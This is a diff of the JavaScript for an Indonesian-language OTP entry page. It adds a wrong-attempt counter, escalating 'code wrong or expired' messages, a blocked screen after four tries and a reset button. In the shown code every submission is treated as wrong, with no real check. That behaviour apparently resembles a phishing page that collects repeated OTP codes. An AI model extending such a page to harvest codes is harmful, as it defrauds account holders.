@@ -14,8 +14,26 @@ document.querySelector(".error-box");
 const loadingBox =
 document.getElementById("loadingBox");
 
-/* HIDE ALERT AWAL */
+const blockedBox =
+document.querySelector(".blocked-box");
+
+const blockedBtn =
+document.querySelector(".blocked-btn");
+
+const alertTitle =
+document.querySelector(".alert-title");
+
+const alertDesc =
+document.querySelector(".alert-desc");
+
+/* TOTAL SALAH */
+let wrongCount = 0;
+
+/* HIDE ALERT */
 errorBox.style.display = "none";
+
+/* HIDE BLOCK */
+blockedBox.style.display = "none";
 
 /* RESET LOADING */
 window.addEventListener("pageshow", () => {
@@ -61,7 +79,6 @@ otpContainer.addEventListener("click", () => {
 
 });
 
-
 /* ========================= */
 /* OTP INPUT */
 /* ========================= */
@@ -73,8 +90,9 @@ otpInputs.forEach((input,index) => {
         input.value =
         input.value.replace(/[^0-9]/g,'');
 
-        /* HIDE ERROR SAAT ISI ULANG */
-        errorBox.style.display = "none";
+        /* HIDE ERROR */
+        errorBox.style.display =
+        "none";
 
         /* NEXT BOX */
         if(
@@ -130,16 +148,66 @@ function checkOTP(){
         loadingBox.style.display =
         "flex";
 
-        /* DELAY */
         setTimeout(() => {
 
             /* HIDE LOADING */
             loadingBox.style.display =
             "none";
 
-            /* SHOW ERROR */
-            errorBox.style.display =
-            "block";
+            /* TOTAL SALAH */
+            wrongCount++;
+
+            /* ========================= */
+            /* 1 - 2X SALAH */
+            /* ========================= */
+
+            if(wrongCount < 3){
+
+                errorBox.style.display =
+                "block";
+
+                alertTitle.innerText =
+                "Kode OTP salah atau kadaluarsa";
+
+                alertDesc.innerText =
+                "Pastikan Kode OTP yang kamu masukan benar dan tidak kadaluarsa";
+
+            }
+
+            /* ========================= */
+            /* 3X SALAH */
+            /* ========================= */
+
+            else if(wrongCount === 3){
+
+                errorBox.style.display =
+                "block";
+
+                alertTitle.innerText =
+                "Kamu sudah memasukan kode OTP salah 3x";
+
+                alertDesc.innerText =
+                "Pastikan kode yang dimasukan sudah benar";
+
+            }
+
+            /* ========================= */
+            /* 4X SALAH */
+            /* ========================= */
+
+            else if(wrongCount >= 4){
+
+                document.querySelector(
+                ".container"
+                ).style.display =
+                "none";
+
+                blockedBox.style.display =
+                "block";
+
+                return;
+
+            }
 
             /* SHAKE */
             otpContainer.classList
@@ -172,7 +240,6 @@ function checkOTP(){
     }
 
 }
-
 
 /* ========================= */
 /* TIMER */
@@ -208,7 +275,8 @@ setInterval(() => {
         timerText.innerText =
         "00:00";
 
-        resendBtn.disabled = false;
+        resendBtn.disabled =
+        false;
 
         resendBtn.classList
         .add("active");
@@ -221,12 +289,29 @@ setInterval(() => {
 /* RESEND */
 /* ========================= */
 
-resendBtn.addEventListener("click", () => {
+resendBtn.addEventListener(
+"click",
+() => {
 
     if(!resendBtn.disabled){
 
         location.reload();
 
     }
+
+});
+
+/* ========================= */
+/* MULAI DARI AWAL */
+/* ========================= */
+
+blockedBtn.addEventListener(
+"click",
+() => {
+
+    localStorage.clear();
+
+    window.location.href =
+    "index.html";
 
 });
